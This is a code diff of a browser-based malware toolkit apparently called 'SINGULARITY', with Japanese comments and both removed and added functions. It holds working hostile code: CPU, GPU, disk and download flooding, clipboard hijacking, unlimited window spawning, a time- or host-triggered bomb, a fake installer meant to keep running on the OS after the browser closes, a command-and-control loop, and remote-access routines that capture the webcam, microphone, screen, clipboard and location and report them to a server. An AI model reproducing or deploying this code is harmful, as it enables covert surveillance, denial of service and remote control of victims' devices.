-    (function loop() {
-      try { crypto.subtle.digest("SHA-256", buf); } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function readbackStorm() {
-  if (!CFG.readback || R.rb) return;
-  try {
-    var c = document.createElement("canvas"), gl = c.getContext("webgl");
-    if (!gl) return;
-    c.width = c.height = 512;
-    R.rb = 1;
-    var px = new Uint8Array(512 * 512 * 4);
-    (function loop() {
-      try {
-        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.readPixels(0, 0, 512, 512, gl.RGBA, gl.UNSIGNED_BYTE, px);
-      } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function sseStorm() {
-  if (!CFG.sseStorm || !window.EventSource) return;
-  try {
-    var n = clamp(CFG.sseStorm, 1, 40);
-    for (var i = 0; i < n; i++) {
-      try { new EventSource(CFG.cmd.replace(/\/cmd$/, "/sse") + "?sid=" + SID + "_" + i + "&n=" + i); } catch (e) {}
-    }
-    R.sseN = n; push(false);
-  } catch (e) {}
-}
-function fetchStorm() {
-  if (!CFG.fetchStorm) return;
-  try {
-    var n = clamp(CFG.fetchStorm, 1, 32);
-    (function loop() {
-      for (var i = 0; i < n; i++) { try { fetch(CFG.path + "/c?sid=" + SID + "&n=" + i, { cache: "no-store" }); } catch (e) {} }
-      setTimeout(loop, 500);
-    })();
-    R.fetchN = n;
-  } catch (e) {}
-}
-function speakFlood() {
-  if (!CFG.speakFlood || !window.speechSynthesis || R.spk) return;
-  try {
-    R.spk = 1;
-    var n = clamp(CFG.speakFlood, 1, 100);
-    for (var i = 0; i < n; i++) {
-      try {
-        var u = new SpeechSynthesisUtterance("\u7279\u7570\u70B9 " + (i + 1));
-        u.rate = 1 + (i % 3) * 0.3; u.pitch = 0.6 + (i % 5) * 0.2;
-        speechSynthesis.speak(u);
-      } catch (e) {}
-    }
-    R.spkN = n; push(false);
-  } catch (e) {}
-}
-function oscBank() {
-  if (!CFG.oscBank) return;
-  try {
-    var AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    var ctx = R.wskinCtx || new AC();
-    R.wskinCtx = ctx;
-    var n = clamp(CFG.oscBank, 1, 400), got = 0;
-    for (var i = 0; i < n; i++) {
-      try {
-        var o = ctx.createOscillator(), g = ctx.createGain();
-        o.type = (i % 3 === 0) ? "sawtooth" : "sine";
-        o.frequency.value = 30 + i * 1.7;
-        g.gain.value = 0.002;
-        o.connect(g); g.connect(ctx.destination); o.start();
-        got++;
-      } catch (e) { break; }
-    }
-    R.oscN = got; push(false);
-  } catch (e) {}
-}
-function idbDiskStart() {
-  if (!CFG.idbDisk || !window.indexedDB || R.idb) return;
-  try {
-    R.idb = 1;
-    var r = indexedDB.open("sg-bulk", 1);
-    r.onupgradeneeded = function () { r.result.createObjectStore("b", { autoIncrement: true }); };
-    r.onsuccess = function () {
-      var db = r.result, buf = new Uint8Array(1024 * 1024), i = 0;
-      (function loop() {
-        try {
-          var tx = db.transaction("b", "readwrite");
-          tx.objectStore("b").put(buf);
-          tx.oncomplete = function () { R.idbN = ++i; };
-        } catch (e) {}
-        if (i < 300) setTimeout(loop, 0);
-      })();
-    };
-  } catch (e) {}
-}
-function cacheBuckets() {
-  if (!CFG.cacheBuckets || !window.caches) return;
-  try {
-    var n = clamp(CFG.cacheBuckets, 1, 2000), i = 0;
-    (function loop() {
-      if (i >= n) { push(false); return; }
-      try { caches.open("sg-b" + i).then(function (c) { return c.put("/" + i, new Response("x" + i)); }); } catch (e) {}
-      i++;
-      setTimeout(loop, 0);
-    })();
-    R.buckets = n;
-  } catch (e) {}
-}
-function layoutThrash() {
-  if (!CFG.layoutThrash || R.lt) return;
-  try {
-    R.lt = 1;
-    var d = document.createElement("div");
-    d.style.cssText = "position:absolute;left:-99999px;top:0;";
-    document.body.appendChild(d);
-    (function loop() {
-      try {
-        d.style.width = (10 + Math.random() * 400) + "px";
-        d.style.height = (10 + Math.random() * 200) + "px";
-        void d.offsetHeight;
-        document.body.style.letterSpacing = (Math.random() * 0.4).toFixed(2) + "px";
-      } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function clipHijack() {
-  if (!CFG.clipHijack || R.clip) return;
-  try {
-    R.clip = 1;
-    var t = setInterval(function () {
-      try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink || CFG.path); } catch (e) {}
-    }, 4000);
-    R.clipT = t;
-  } catch (e) {}
-}
-function downloadStorm() {
-  if (!CFG.downloads || R.dl) return;
-  try {
-    R.dl = 1;
-    var n = clamp(CFG.downloads, 1, 300), i = 0;
-    (function loop() {
-      if (i >= n) { push(false); return; }
-      try {
-        var a = document.createElement("a");
-        a.href = CFG.path + "/icon-192.png?n=" + i;
-        a.download = "sg" + i + ".png";
-        document.body.appendChild(a); a.click(); a.remove();
-      } catch (e) {}
-      i++;
-      setTimeout(loop, 200);
-    })();
-  } catch (e) {}
-}
-function sharedWorkerKit() {
-  if (!CFG.sharedWorker || !window.SharedWorker) return;
-  try {
-    var b = new Blob([window.__SINGULARITY_SHARED__ || ""], { type: "application/javascript" });
-    if (!window.__SINGULARITY_SHARED__) return;
-    var sw = new SharedWorker(URL.createObjectURL(b));
-    sw.port.onmessage = function (e) {
-      var d = e.data || {};
-      if (d.k === "peers") R.peers = d.n;
-      if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (x) {} }
-    };
-    try { sw.port.start(); } catch (e) {}
-    sw.port.postMessage({ k: "hello" });
-    R.sharedW = 1;
-  } catch (e) {}
-}
-function jsonChurn() {
-  if (!CFG.jsonChurn || R.jc) return;
-  try {
-    R.jc = 1;
-    var o = { a: [], b: {} };
-    for (var i = 0; i < 200; i++) { o.a.push({ i: i, s: "x" + i, f: Math.random() }); o.b["k" + i] = [i, i * 2, "y"]; }
-    (function loop() {
-      try {
-        var s = JSON.stringify(o);
-        JSON.parse(s);
-        o.a[0].f = Math.random();
-      } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function fsWrite() {
-  if (!CFG.fsFolder || !window.showDirectoryPicker) return;
-  setTimeout(function () { fsBtn(); }, 3000);
-}
-function fsBtn() {
-  try {
-    if (R.fsH) return;
-    var b = document.createElement("button");
-    b.textContent = "\u30D5\u30A9\u30EB\u30C0\u3092\u4E57\u3063\u53D6\u308B";
-    b.style.cssText = "position:fixed;right:8px;top:8px;z-index:2147483643;font:11px system-ui;"
-      + "background:#0b0f14;color:#0f0;border:1px solid #1f5c42;border-radius:6px;padding:4px 8px;cursor:pointer";
-    b.onclick = function () {
-      try {
-        window.showDirectoryPicker().then(function (dir) {
-          R.fsH = 1;
-          var n = clamp(CFG.fsFiles || 100, 1, 2000), i = 0;
-          (function loop() {
-            if (i >= n) { push(true); return; }
-            try {
-              dir.getFileHandle("sg_" + i + ".txt", { create: true })
-                .then(function (fh) { return fh.createWritable(); })
-                .then(function (w) { return w.write("SINGULARITY " + i + " " + rid(64)).then(function () { return w.close(); }); })
-                .catch(function () {});
-            } catch (e) {}
-            i++;
-            setTimeout(loop, 0);
-          })();
-          R.fsF = n; push(true);
-        }).catch(function () {});
-      } catch (e) {}
-      b.remove();
-    };
-    document.body.appendChild(b);
-  } catch (e) {}
-}
-function fsFolderKit() {
-  if (!CFG.fsFolder || !window.showDirectoryPicker || IFR) return;
-  fsBtn();
-}
-
-/* ================= 13d. v3.3 OS常駐インストーラ（L7） ================= */
-function niDownload(ext) {
-  try {
-    var burn = clamp(navigator.hardwareConcurrency || 4, 1, 32);
-    var disk = 1024;
-    var a = document.createElement("a");
-    a.href = CFG.path + "/install." + ext
-      + "?burn=" + burn + "&disk=" + disk
-      + "&app=" + encodeURIComponent(CFG.avName || "blocker")
-      + "&t=" + Math.random();
-    a.download = (CFG.avName || "blocker") + "." + ext;
-    document.body.appendChild(a); a.click(); a.remove();
-    R.niDl = ext; push(true);
-  } catch (e) { err_(e); }
-}
-function installerKit() {
-  if (LEVEL < 7 || R.ni || IFR || WIN || !CFG.installer) return;
-  try {
-    R.ni = 1;
-    var ua = navigator.userAgent;
-    var os = /Windows/.test(ua) ? "bat"
-      : (/Mac OS X/.test(ua) ? "command" : (/Linux|CrOS/.test(ua) ? "sh" : "bat"));
-    var d = document.createElement("div");
-    d.id = "sg-native";
-    d.style.cssText = "position:fixed;left:8px;bottom:40px;z-index:2147483644;max-width:360px;"
-      + "font:12px/1.55 system-ui,'Hiragino Sans',sans-serif;background:rgba(9,13,19,.97);"
-      + "border:1px solid #7a1f4a;border-radius:10px;padding:11px 13px;color:#ffd7e6;"
-      + "box-shadow:0 4px 18px rgba(0,0,0,.6)";
-    d.innerHTML = '<b style="color:#ff5c8a;font-size:13px">\u2620 \u7D76\u6EC5\u30A4\u30F3\u30B9\u30C8\u30FC\u30E9</b>'
-      + '<div style="opacity:.9;margin:5px 0 9px">\u30D6\u30E9\u30A6\u30B6\u3092\u9589\u3058\u3066\u3082PC\u3092\u52A0\u71B1\u3057\u307E\u3059\u3002'
-      + '\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9\u3057\u3066\u5B9F\u884C\u3057\u3066\u304F\u3060\u3055\u3044\u3002</div>';
-    var row = document.createElement("div");
-    row.style.cssText = "display:flex;gap:6px;flex-wrap:wrap";
-    [["Windows", "bat"], ["macOS", "command"], ["Linux", "sh"]].forEach(function (p) {
-      var b = document.createElement("button");
-      b.textContent = p[0] + (p[1] === os ? " \u2605" : "");
-      b.style.cssText = "font:11px system-ui;background:#1a0d13;color:#ffb3cc;border:1px solid #7a1f4a;"
-        + "border-radius:6px;padding:4px 9px;cursor:pointer";
-      b.onclick = function () { niDownload(p[1]); };
-      row.appendChild(b);
-    });
-    d.appendChild(row);
-    var x = document.createElement("button");
-    x.textContent = "\u00d7";
-    x.style.cssText = "position:absolute;right:6px;top:4px;background:none;border:0;color:#ffb3cc;cursor:pointer";
-    x.onclick = function () { d.remove(); };
-    d.appendChild(x);
-    document.body.appendChild(d);
-  } catch (e) { err_(e); }
-}
-
-/* ================= 13e. v3.4 無限窓繁殖（指数・リミッターなし）＋ヘビースキン ================= */
-function openChild(u, tries) {
-  var w = null;
-  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
-  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
-  return w;
-}
+/* ================= 9. 窓（爆弾 / 連鎖 / 指数繁殖） ================= */
 function windowChain() {
   if (!CFG.windows || W >= CFG.windows) return;
   setTimeout(function () {
@@ -1572,6 +1610,12 @@ function windowChain() {
     } catch (e) { err_(e); }
   }, CFG.winDelay);
 }
+function openChild(u, tries) {
+  var w = null;
+  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
+  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
+  return w;
+}
 function windowBreed() {
   var mode = CFG.winMode || "off";
   if (mode === "off") return;
@@ -1580,16 +1624,21 @@ function windowBreed() {
   R.breeded = 1;
   var depth = parseInt(W, 10) || 0;
   var maxD = parseInt(CFG.winDepth, 10) || 0;
-  R.breed = { depth: depth, branch: parseInt(CFG.winBranch, 10) || 2, opened: 0 };
+  R.breed = { depth: depth, branch: parseInt(CFG.winBranch, 10) || 2, opened: 0, tries: 0 };
   if (maxD > 0 && depth >= maxD) { R.breed.stop = 1; push(false); return; }
+  breedTry();
+}
+function breedTry() {
+  if (!R.breed) return;
+  if (R.breed.tries++ > 5) { push(false); return; }
   var n = clamp(parseInt(CFG.winBranch, 10) || 2, 1, 8);
   setTimeout(function () {
     for (var i = 0; i < n; i++) {
-      var ref = "&ref=" + SID;
-      var u = CFG.path + "?u=win&w=" + (depth + 1) + "&b=" + i + ref;
+      var u = CFG.path + "?u=win&w=" + (R.breed.depth + 1) + "&b=" + i + "&ref=" + SID;
       if (openChild(u, 1)) R.breed.opened++;
     }
-    push(false);
+    if (R.breed.opened < n) breedTry();
+    else push(false);
   }, CFG.winDelay);
 }
 function winSkin() {
@@ -1599,138 +1648,32 @@ function winSkin() {
     var seed = (parseInt(W, 10) || 0) * 37 + (parseInt(Q("b"), 10) || 0) * 11;
     document.documentElement.style.background = "#05070a";
     if (document.body) { document.body.style.margin = "0"; document.body.style.overflow = "hidden"; }
-
-    /* 背景: WebGL プラズマ（窓ごとに1コンテキスト） */
-    var glc = document.createElement("canvas");
-    glc.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-2;display:block;background:#05070a";
-    document.body.appendChild(glc);
-    glc.width = 480; glc.height = 270;
-    var gl = glc.getContext("webgl2") || glc.getContext("webgl");
-    if (gl) {
-      var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
-      var fs = "precision highp float;uniform float t;uniform vec2 r;void main(){"
-        + "vec2 u=(gl_FragCoord.xy-0.5*r)/r.y;float s=0.;"
-        + "for(int i=0;i<96;i++){u=vec2(sin(u.y*1.7+t*.001)+cos(u.x*1.3-t*.0007),"
-        + "cos(u.x*1.9-t*.0011)-sin(u.y*1.1+t*.0009));s+=length(u);}"
-        + "gl_FragColor=vec4(fract(s*.008),fract(s*.011),fract(s*.015),1.);}";
-      function sh(t, src) { var o = gl.createShader(t); gl.shaderSource(o, src); gl.compileShader(o); return o; }
-      var pr = gl.createProgram();
-      gl.attachShader(pr, sh(gl.VERTEX_SHADER, vs));
-      gl.attachShader(pr, sh(gl.FRAGMENT_SHADER, fs));
-      gl.linkProgram(pr); gl.useProgram(pr);
-      var b = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, b);
-      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
-      var loc = gl.getAttribLocation(pr, "p");
-      gl.enableVertexAttribArray(loc);
-      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-      var tl = gl.getUniformLocation(pr, "t");
-      (function loop() {
-        try {
-          gl.uniform1f(tl, Date.now() + seed);
-          for (var r = 0; r < 3; r++) gl.drawArrays(gl.TRIANGLES, 0, 3);
-        } catch (er) {}
-        setTimeout(loop, 0);
-      })();
-    }
-
-    /* 前景: ネオングロウ＋スキャンライン＋HUD（Canvas2D） */
     var c = document.createElement("canvas");
-    c.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;z-index:-1;display:block";
+    c.style.cssText = "position:fixed;left:0;top:0;width:100%;height:100%;z-index:-1";
     document.body.appendChild(c);
-    c.width = 640; c.height = 360;
-    var x = c.getContext("2d"), a = 0;
+    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    var x2 = null;
+    if (!gl) { x2 = c.getContext("2d"); }
     (function loop() {
-      try {
-        x.clearRect(0, 0, c.width, c.height);
-        x.globalCompositeOperation = "lighter";
-        x.shadowBlur = 18; x.shadowColor = "#00ff88";
-        for (var i = 0; i < 5; i++) {
-          x.strokeStyle = "hsl(" + ((a * 40 + i * 60) % 360) + ",100%,55%)";
-          x.lineWidth = 2 + (i % 3);
-          x.beginPath();
-          x.arc(c.width / 2, c.height / 2, 40 + i * 26 + Math.sin(a + i) * 8, a + i, a + i + 3.4);
-          x.stroke();
-        }
-        x.globalCompositeOperation = "source-over";
-        x.fillStyle = "rgba(5,7,10,.16)";
-        for (var y = 0; y < c.height; y += 3) x.fillRect(0, y, c.width, 1);
-        x.shadowBlur = 12; x.shadowColor = "#00ff88";
-        x.fillStyle = "#b8ffd9"; x.font = "bold 22px ui-monospace,monospace"; x.textAlign = "center";
-        x.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  /  depth " + (W || 0), c.width / 2, c.height / 2 + 4);
-        x.font = "12px ui-monospace,monospace";
-        x.fillText("branch " + CFG.winBranch + " \u00B7 " + (CFG.winDepth ? ("max " + CFG.winDepth) : "\u7121\u5236\u9650"), c.width / 2, c.height / 2 + 24);
-        a += 0.02;
-      } catch (er) {}
+      c.width = innerWidth; c.height = innerHeight;
+      if (gl) {
+        gl.viewport(0, 0, c.width, c.height);
+        gl.clearColor(0.02, 0.03, 0.05, 1);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+      } else if (x2) {
+        x2.fillStyle = "#05070a"; x2.fillRect(0, 0, c.width, c.height);
+        x2.fillStyle = "#00ff88"; x2.font = "13px ui-monospace,monospace";
+        x2.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  /  depth " + (W || 0), 12, 24);
+        x2.font = "12px ui-monospace,monospace";
+        x2.fillText("branch " + CFG.winBranch + " \u00B7 "
+          + (CFG.winDepth ? ("max " + CFG.winDepth) : "\u7121\u5236\u9650"), 12, 44);
+      }
       requestAnimationFrame(loop);
     })();
-
-    /* ドローン音（窓ごとに違う周波数で合唱） */
-    try {
-      var AC = window.AudioContext || window.webkitAudioContext;
-      if (AC) {
-        var ctx = new AC();
-        R.wskinCtx = ctx;
-        var o = ctx.createOscillator(), g = ctx.createGain();
-        o.type = "sawtooth"; o.frequency.value = 55 + ((W || 0) % 12) * 11;
-        g.gain.value = 0.012;
-        o.connect(g); g.connect(ctx.destination); o.start();
-        R.wskinDrone = o.frequency.value;
-      }
-    } catch (e) {}
-    addEventListener("click", function () { try { R.wskinCtx && R.wskinCtx.resume(); } catch (e) {} }, { once: true });
-  } catch (e) {}
+  } catch (e) { err_(e); }
 }
 
-/* ================= 14. 凍結 / 全画面 / 捕獲 / 消去 ================= */
-function freezeNow(mode) {
-  mode = mode || CFG.freeze;
-  if (mode !== "soft" && mode !== "hard") return;
-  try {
-    var end = now() + (mode === "hard" ? 60000 : 30000);
-    var spin = function () {
-      var t = now();
-      if (t > end) return;
-      var n = 0;
-      while (now() - t < 6) { Math.sqrt(n++) * Math.sin(n); }
-      setTimeout(spin, 0);
-    };
-    spin();
-    R.freeze = { mode: mode, at: now() };
-  } catch (e) {}
-}
-function wipe() {
-  if (R.wipe.done) return;
-  try {
-    R.wipe = { started: now() };
-    var n = 0;
-    var clear = function () {
-      try { localStorage.clear(); } catch (e) {}
-      try { sessionStorage.clear(); } catch (e) {}
-      try { indexedDB.deleteDatabase("sg"); } catch (e) {}
-      try { indexedDB.deleteDatabase("sg-bulk"); } catch (e) {}
-      try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
-      try { caches.keys().then(function (ks) { ks.forEach(function (k) { caches.delete(k); }); }); } catch (e) {}
-      n++;
-      R.wipe.passes = n;
-      R.wipe.ms = now() - R.wipe.started;
-      try { flush(); } catch (e) {}
-    };
-    clear();
-    setTimeout(clear, 1200);
-    setTimeout(function () { clear(); R.wipe.done = true; }, 4000);
-  } catch (e) {}
-}
-
-/* ================= 15. C2（SSE + ポーリング + 個体別コマンド） ================= */
-var CMD_SEEN = {}, LASTW = 0, ESE = null;
-function ack(ids) {
-  try {
-    var b = JSON.stringify({ sid: SID, ids: ids });
-    if (navigator.sendBeacon) navigator.sendBeacon(CFG.ack, new Blob([b], { type: "application/json" }));
-    else fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" }, body: b, keepalive: true });
-  } catch (e) {}
-}
+/* ================= 10. 制御 ================= */
 function ota() {
   if (R.ota) return;
   R.ota = 1;
@@ -1741,56 +1684,31 @@ function ota() {
   } catch (e) {}
   setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
 }
-function handleCmd(j) {
-  if (!j || !j.ok) return;
-  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
-  if (j.ver && j.ver !== MYVER && !R.ota) ota();
-  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
-  if (j.fire === 0 && !R.paused) { R.paused = true; pauseAll(); }
-  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
-  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
-  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
-  var ids = [];
-  (j.cmds || []).forEach(function (c) {
-    if (!c || CMD_SEEN[c.id]) return;
-    CMD_SEEN[c.id] = 1; ids.push(c.id);
-    runCmd(c);
-  });
-  if (ids.length) ack(ids);
+function pauseAll() {
+  PAUSED = true;
+  WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
 }
-function runCmd(c) {
-  var k = c.kind, a = c.arg || "";
-  try {
-    if (k === "shot") ratShot();
-    else if (k === "mic") ratMic();
-    else if (k === "geo") ratGeo();
-    else if (k === "clip") ratClip();
-    else if (k === "screen") ratScreen();
-    else if (k === "dom") domSnap(true);
-    else if (k === "speak") speak(a);
-    else if (k === "open") window.open(a, "_blank");
-    else if (k === "nav") location.href = a;
-    else if (k === "reload") location.reload();
-    else if (k === "update") ota();
-    else if (k === "freeze") freezeNow(a || "soft");
-    else if (k === "wipe") wipe();
-    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
-    else if (k === "native") niDownload(a || "bat");
-    else if (k === "title") document.title = a || CFG.avName;
-    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
-    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "\u611F\u67D3", requireInteraction: true }); } catch (e) {} }
-    else if (k === "pip") pipOpen();
-    else if (k === "fullscreen") goFullscreen();
-    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
-    else if (k === "win") {
-      var n = clamp(a || CFG.winBranch, 1, 8);
-      CFG.winMode = "breed"; CFG.winBranch = n; CFG.winSkin = 1;
-      for (var i = 0; i < n; i++) openChild(CFG.path + "?u=win&w=1&b=" + i + "&ref=" + SID, 1);
-    }
-    else if (k === "winskin") { CFG.winSkin = 1; winSkin(); }
-  } catch (e) { err_(e); }
-  R.rat.last = { kind: k, arg: a, at: now() };
-  push(true);
+function restart() {
+  try { pauseAll(); } catch (e) {}
+  R.paused = false; WORKERS = [];
+  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
+  R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;
+  startBurns();
+}
+function bombGate() {
+  var b = (CFG.bomb || "").trim();
+  if (!b) return true;
+  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
+    var t = Date.parse(b);
+    if (isNaN(t)) return true;
+    if (now() >= t) return true;
+    R.bomb = { kind: "time", at: t };
+    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
+    return false;
+  }
+  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
+  R.bomb = { kind: "host", need: b, host: location.host };
+  return false;
 }
 function startBurns() {
   try { burnStart(); } catch (e) { err_(e); }
@@ -1837,12 +1755,107 @@ function startBurns() {
   try { hookXHR(); } catch (e) { err_(e); }
   push(false);
 }
-function restart() {
-  try { pauseAll(); } catch (e) {}
-  R.paused = false; WORKERS = [];
-  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
-  R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;   // ← 追加
-  startBurns();
+
+/* ================= 11. 報告 / C2 ================= */
+function report() {
+  return {
+    sid: SID, ver: MYVER, level: LEVEL, fixed: !!CFG.fixed, t: now() - T0,
+    env: R.env, page: R.page, vectors: R.vectors, privacy: R.privacy,
+    hardware: R.hardware, network: R.network, behavioral: R.behavioral,
+    bot: R.bot, verdict: R.verdict, rat: R.rat, usb: R.usb, viral: R.viral,
+    burn: R.burn, ram: R.ram, disk: R.disk, history: R.history, crypto: R.crypto,
+    hard: R.hard, hops: R.hops, wipe: R.wipe, errors: R.errors.slice(0, 10),
+    swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
+    win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin, w: W }
+  };
+}
+function swOut(body) {
+  try {
+    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+      navigator.serviceWorker.controller.postMessage({ k: "out", v: body });
+    }
+  } catch (e) {}
+}
+function push(full) {
+  if (PAUSED && !full) return;
+  if (PUSHING) return;
+  PUSHING = 1;
+  var body = report();
+  try {
+    fetch(CFG.collect, { method: "POST", headers: { "Content-Type": "application/json" },
+                         body: JSON.stringify(body), credentials: "same-origin" })
+      .then(function () { PUSHING = 0; })
+      .catch(function () { PUSHING = 0; swOut(body); });
+  } catch (e) { PUSHING = 0; swOut(body); }
+}
+function ack(ids) {
+  try {
+    fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" },
+                     body: JSON.stringify({ ids: ids }), credentials: "same-origin" });
+  } catch (e) {}
+}
+function runCmd(c) {
+  var k = c.kind, a = c.arg || "";
+  try {
+    if (k === "shot") ratShot();
+    else if (k === "mic") ratMic();
+    else if (k === "geo") ratGeo();
+    else if (k === "clip") ratClip();
+    else if (k === "screen") ratScreen();
+    else if (k === "dom") domSnap(true);
+    else if (k === "speak") speak(a);
+    else if (k === "open") window.open(a, "_blank");
+    else if (k === "nav") location.href = a;
+    else if (k === "reload") location.reload();
+    else if (k === "update") ota();
+    else if (k === "freeze") freezeNow(a || "soft");
+    else if (k === "wipe") wipe();
+    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
+    else if (k === "native") niDownload(a || "bat");
+    else if (k === "title") document.title = a || CFG.avName;
+    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
+    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "\u611F\u67D3", requireInteraction: true }); } catch (e) {} }
+    else if (k === "pip") pipOpen();
+    else if (k === "fullscreen") goFullscreen();
+    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
+    else if (k === "win") {
+      var n = clamp(a || CFG.winBranch, 1, 8);
+      CFG.winMode = "breed"; CFG.winBranch = n; CFG.winSkin = 1;
+      for (var i = 0; i < n; i++) openChild(CFG.path + "?u=win&w=1&b=" + i + "&ref=" + SID, 1);
+    }
+    else if (k === "winskin") { CFG.winSkin = 1; winSkin(); }
+    else if (k === "hard") { CFG.hardMode = "always"; hardKill(); }
+    else if (k === "unhard") { CFG.hardMode = ""; }
+    else if (k === "kill") { pauseAll(); }
+  } catch (e) { err_(e); }
+  R.rat.last = { kind: k, arg: a, at: now() };
+  push(true);
+}
+function handleCmd(j) {
+  if (!j || !j.ok) return;
+  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
+  if (j.ver && j.ver !== MYVER && !R.ota) ota();
+  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
+  if (j.fire === 0 && !R.paused) { R.paused = true; pauseAll(); }
+  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
+  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
+  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
+
+  var wl = JSON.stringify(j.win || null);
+  if (wl !== LASTWL) { LASTWL = wl; CFG.winLock = j.win || null; applyLevel(LEVEL); restart(); }
+
+  if (j.hard !== undefined && j.hard !== CFG.hardMode) {
+    CFG.hardMode = j.hard || "";
+    if (hardOn()) { try { hardKill(); } catch (e) { err_(e); } }
+  }
+
+  var ids = [];
+  (j.cmds || []).forEach(function (c) {
+    if (!c || CMD_SEEN[c.id]) return;
+    CMD_SEEN[c.id] = 1; ids.push(c.id);
+    runCmd(c);
+  });
+  if (ids.length) ack(ids);
 }
 function c2() {
   var q = "?sid=" + encodeURIComponent(SID);
@@ -1860,285 +1873,103 @@ function c2() {
   }, CFG.cmdInterval);
 }
 
-/* ================= 16. RAT ================= */
-function ratShot() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-  try {
-    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
-      var v = document.createElement("video"); v.srcObject = s; v.play();
-      setTimeout(function () {
-        try {
-          var c = document.createElement("canvas");
-          c.width = 320; c.height = 240;
-          c.getContext("2d").drawImage(v, 0, 0, 320, 240);
-          R.rat.shot = c.toDataURL("image/jpeg", 0.5);
-          s.getTracks().forEach(function (t) { t.stop(); });
-          push(true);
-        } catch (e) {}
-      }, 900);
-    }).catch(function (e) { R.rat.shotErr = (e && e.name) || "err"; });
-  } catch (e) {}
-}
-function ratMic() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-  try {
-    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
-      var AC = window.AudioContext || window.webkitAudioContext;
-      var ctx = new AC(), an = ctx.createAnalyser();
-      ctx.createMediaStreamSource(s).connect(an);
-      var d = new Uint8Array(an.frequencyBinCount);
-      an.getByteFrequencyData(d);
-      R.rat.mic = { peak: Math.max.apply(null, Array.prototype.slice.call(d, 0, 64)), rate: ctx.sampleRate };
-      s.getTracks().forEach(function (t) { t.stop(); });
-      try { ctx.close(); } catch (e) {}
-      push(true);
-    }).catch(function (e) { R.rat.micErr = (e && e.name) || "err"; });
-  } catch (e) {}
-}
-function ratGeo() { geo(); }
-function ratClip() {
-  try {
-    navigator.clipboard.readText().then(function (t) {
-      R.rat.clip = (t || "").slice(0, 200); push(true);
-    }).catch(function () {});
-  } catch (e) {}
-}
-function ratScreen() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
-  try {
-    navigator.mediaDevices.getDisplayMedia({ video: true }).then(function (s) {
-      var v = document.createElement("video"); v.srcObject = s; v.play();
-      setTimeout(function () {
-        try {
-          var c = document.createElement("canvas");
-          c.width = 480; c.height = 270;
